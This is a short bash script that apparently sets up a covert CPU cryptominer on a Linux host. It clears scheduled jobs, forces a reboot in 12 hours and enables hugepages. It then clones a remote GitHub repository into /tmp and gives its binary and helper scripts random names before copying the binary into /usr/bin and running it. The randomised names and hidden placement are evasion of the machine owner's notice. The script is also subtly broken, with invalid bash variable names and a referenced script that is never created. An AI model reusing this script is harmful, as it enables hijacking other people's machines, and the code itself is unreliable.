#!/bin/bash

ID="$(hostname)"

THREADS="$(nproc --all)"

for i in `atq | awk '{print $1}'`;do atrm $i;done
echo 'sudo reboot -f' | at now + 12 hours

apt -y install gpw
apt -y install sudo



timer=$(gpw 1 11)
tmpfoldername=$(gpw 1 7)
softwarename=$(gpw 1 9)

1x=$(gpw 1 2)
2x=$(gpw 1 4)
3x=$(gpw 1 6)
4x=$(gpw 1 8)
5x=$(gpw 1 10)
6x=$(gpw 1 12)

#rm -rf /tmp/defaultsoft/
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 2
cd /tmp && mkdir $tmpfoldername
git clone https://github.com/tokdok/default.git /tmp/$tmpfoldername
cd /tmp/$tmpfoldername
mv /tmp/$tmpfoldername/soft /tmp/$tmpfoldername/$softwarename
chmod +x /tmp/$tmpfoldername/$softwarename
chmod 777 ./*.sh
cp /tmp/$tmpfoldername/$softwarename /usr/bin/

sed -i "s/defaultsoftwarename/$softwarename/" 1.sh
sed -i "s/defaultsoftwarename/$softwarename/" 2.sh
sed -i "s/defaultsoftwarename/$softwarename/" 3.sh
sed -i "s/defaultsoftwarename/$softwarename/" 4.sh
sed -i "s/defaultsoftwarename/$softwarename/" 5.sh
sed -i "s/defaultsoftwarename/$softwarename/" 6.sh

mv 1.sh $1x.sh
mv 2.sh $2x.sh
mv 3.sh $3x.sh
mv 4.sh $4x.sh
mv 5.sh $5x.sh
mv 6.sh $6x.sh
sleep 3



sudo apt-get install dos2unix

sudo dos2unix $timer.sh
sudo dos2unix $4x.sh
sudo dos2unix $2x.sh
sudo dos2unix $5x.sh
sudo dos2unix $3x.sh
sudo dos2unix $6x.sh
sudo dos2unix $1x.sh

sudo ./$timer.sh & ./defaultchecker.sh


